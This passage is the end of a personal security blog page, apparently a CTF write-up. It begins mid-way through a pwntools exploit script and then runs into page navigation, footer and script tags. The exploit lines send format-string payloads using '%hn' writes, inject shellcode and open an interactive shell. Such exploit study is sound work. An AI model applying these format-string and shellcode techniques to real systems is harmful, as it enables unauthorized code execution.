class="line"></span><br><span class="line">io.writeline("<span class="comment">%"+str(ebp)+"x%4$hn")</span></span><br><span class="line">io.writeline(shellcode+"<span class="comment">%"+str(0xa480-len(shellcode))+"x%"+str(12)+"$hn")</span></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
  
    <nav id="page-nav">
      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
    </nav>
  
</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
    	<div class="footer-left">
    		&copy; 2016 b1gtang
    	</div>
      	<div class="footer-right">
      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
      	</div>
    </div>
  </div>
</footer>
    </div>
    
  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">


<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: true,
		isHome: true,
		isPost: false,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>
<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
<script src="/js/main.js"></script>






<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


  </div>
</body>
</html>